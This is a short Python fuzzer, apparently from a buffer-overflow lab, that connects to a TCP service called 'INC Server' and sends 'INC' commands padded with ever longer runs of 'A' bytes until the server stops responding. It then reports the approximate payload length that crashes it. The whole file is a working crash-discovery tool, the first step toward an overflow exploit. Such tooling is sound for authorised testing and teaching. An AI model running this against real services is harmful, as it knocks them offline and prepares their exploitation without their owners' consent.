#!/usr/bin/env python3
'''
A fuzzer to determine the amount of bytes needed before crashing INC Server.

Author: Grant Hawerlander (@granthaw)
'''
import socket
import sys
import time

def fuzz_server(host, port):
    # start small, increment by reasonable amounts
    buffer_size = 100
    increment = 100
    max_size = 5000
    
    print("[*] Starting fuzzer against " + host + ":" + str(port))
    print("[*] Initial size: " + str(buffer_size) + ", Increment: " + str(increment))
    print("-" * 50)
    
    while buffer_size <= max_size:
        try:
            # connect to server
            print("[*] Sending " + str(buffer_size) + " bytes...", end=" ")
            
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((host, port))
            
            # recv welcome banner
            banner = s.recv(1024)
            
            # send INC command with a bunch of A's
            payload = b"INC " + b"A" * buffer_size + b"\n"
            s.send(payload)
            
            # try to recv response
            response = s.recv(1024)
            print("OK - Server responded")
            
            s.close()
            
            # wait between requests
            time.sleep(1)
            
            # bump it up
            buffer_size += increment
            
        except socket.timeout:
            print("TIMEOUT - Server might have crashed!")
            print("[!] Crash likely occurred at " + str(buffer_size) + " bytes")
            return buffer_size
            
        except ConnectionRefusedError:
            print("CONNECTION REFUSED - Server crashed!")
            print("[!] Server crashed at " + str(buffer_size) + " bytes")
            return buffer_size
            
        except Exception as e:
            print("ERROR: " + str(e))
            print("[!] Server likely crashed at " + str(buffer_size) + " bytes")
            return buffer_size
    
    print("[*] No crash found within max size")
    return None

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: " + sys.argv[0] + " <host> <port>")
        print("Example: " + sys.argv[0] + " 127.0.0.1 2223")
        sys.exit(1)
    
    host = sys.argv[1]
    port = int(sys.argv[2])
    
    crash_size = fuzz_server(host, port)
    
    if crash_size:
        print("\n" + "=" * 50)
        print("[+] CRASH DETECTED at approximately " + str(crash_size) + " bytes")
        print("[+] Minimum crash size is likely " + str(crash_size - 100) + " to " + str(crash_size))
        print("=" * 50)